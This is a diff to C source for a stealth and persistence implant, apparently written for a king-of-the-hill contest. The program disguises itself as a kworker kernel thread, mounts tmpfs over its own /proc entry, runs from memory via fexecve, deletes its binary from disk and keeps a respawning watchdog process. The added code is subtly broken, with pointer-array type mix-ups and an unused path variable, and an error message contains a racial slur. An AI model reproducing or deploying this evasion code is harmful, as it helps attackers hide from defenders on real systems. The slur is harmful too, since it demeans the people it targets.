@@ -16,7 +16,6 @@
 #include <signal.h>
 
 #define TARGET_PROCESS "[kworker/0:5]"
-#define PROC_PATH "/proc/self"
 #define FS_TYPE "tmpfs"
 #define MOUNT_FLAG 0
 #define MOUNT_DATA NULL
@@ -28,7 +27,7 @@ pid_t b_pid = -1;
 void daemonize(){
     pid_t pid;
 
-    // first fork 
+    // first fork
     pid = fork();
     if(pid < 0) exit(EXIT_FAILURE);
     if(pid > 0) exit(EXIT_SUCCESS);     // parent exists
@@ -54,11 +53,13 @@ void daemonize(){
 
     // redirect stdin, stdout, stderr to /dev/null
     int fd;
-
     fd = open("/dev/null", O_RDWR);
-    dup2(fd, 0);        // stdin
-    dup2(fd, 1);        // stdout
-    dup2(fd, 2);        // stderr
+    if(fd != -1) {
+        dup2(fd, 0);                // stdin
+        dup2(fd, 1);                // stdout
+        dup2(fd, 2);                // stderr
+        if(fd > 2) close(fd);       // closes extra fd
+    }
 }
 
 void MaskIt(char **argv){
@@ -72,9 +73,11 @@ void MaskIt(char **argv){
     // masking cli args
     memset(argv[0], 0, strlen(argv[0]));
     strncpy(argv[0], TARGET_PROCESS, strlen(TARGET_PROCESS));
-    
-    // mount tmpfs over /proc/self
-    if(mount(FS_TYPE, PROC_PATH, FS_TYPE, MOUNT_FLAG, MOUNT_DATA) != 0) exit(EXIT_FAILURE);
+
+    // mount tmpfs over the process files
+    char proc_dir[64];
+    snprintf(proc_dir, sizeof(proc_dir), "/proc/%d", getpid());
+    mount(FS_TYPE, proc_dir, FS_TYPE, MOUNT_FLAG, MOUNT_DATA);
 }
 
 void GetTheHill(){
@@ -109,7 +112,7 @@ void SpawnThePartner(){
     b_pid = fork();
 
     if(b_pid < 0) return;               // fork failed
-    if(b_pid == 0) b_pid = getppid();   // b_pid is now the parent, this program is the child    
+    if(b_pid == 0) b_pid = getppid();   // b_pid is now the parent, this program is the child
 }
 
 void ZombieManager(int sig){
@@ -134,14 +137,25 @@ void Pivot2RAM(char **argv){
     }
     close(disk_fd);
 
-    // the secret handshake
-    char *env[]= {"daemon=1", NULL};
+    // getting absolute path for deletion
+    char disk_path[1024];
+    memset(disk_path, 0, sizeof(disk_path));
+    readlink("/proc/self/exe", disk_path, sizeof(disk_path) - 1);
+
+    // environmental handshake
+    char *daemon_env[1100];
+    char * path_env[1100];
+    snprintf(daemon_env, sizeof(daemon_env), "daemon=true");
+    snprintf(path_env, sizeof(path_env), "DISK_PATH=%s", disk_path);
+
+    char *env[] = { daemon_env, path_env, NULL};
 
     // execute from RAM with fd
     fexecve(mem_fd, argv, env);
 }
 
 int main(int argc, char *argv[]){
+    (void) argc;
     // check for root
     if(getuid() != 0){
         printf("root privileges needed negro!");
@@ -151,10 +165,11 @@ int main(int argc, char *argv[]){
     // fexecve replaces the current process, starts new one with main()
     if(getenv("daemon") == NULL){
         // get it to pivot
-        Pivot2RAM(argv);                
+        Pivot2RAM(argv);
     } else {
         // pivot success, delete from disk
-        unlink(argv[0]);
+        char *to_del = getenv("DISK_PATH");
+        if(to_del) unlink(argv[0]);
     }
 
     daemonize();
@@ -172,7 +187,7 @@ int main(int argc, char *argv[]){
     while(1){
         // check if partner is alive
         if(kill(b_pid, 0) == -1 && errno == ESRCH) SpawnThePartner();       // flag 0 = send no signal
-        
+
         // koth
         GetTheHill();
 
